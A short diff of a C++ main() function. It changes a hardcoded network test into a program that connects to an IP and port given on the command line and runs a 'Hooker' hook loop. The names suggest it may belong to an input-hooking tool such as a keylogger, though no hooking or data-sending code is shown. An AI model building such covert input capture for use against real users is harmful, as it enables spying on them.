@@ -5,14 +5,16 @@
 #include "Hooker.hh"
 #include "reseau/Network.hh"
 
-int main()
+int main(int ac, char **av)
 {
-//	Hooker& hooker = Hooker::getInstance();
-	Network* network = new Network("4242", "10.41.174.3");
-	network->initNetwork();
-	network->write("coucou!", 7);
-	while (1) {
-		network->write("coucou!", 7);
+	if (ac >= 3)
+	{
+		Network* network = new Network(av[2], av[1]);
+		Hooker& hooker = Hooker::getInstance();
+//		hooker.setNetwork(network);
+		hooker.runHookLoop();
+		return EXIT_SUCCESS;
 	}
-	//hooker.runHookLoop();
+	std::cerr << "Usage: " << av[0] << " [ip]" << " [port]" << std::endl;
+	return EXIT_FAILURE;
 }
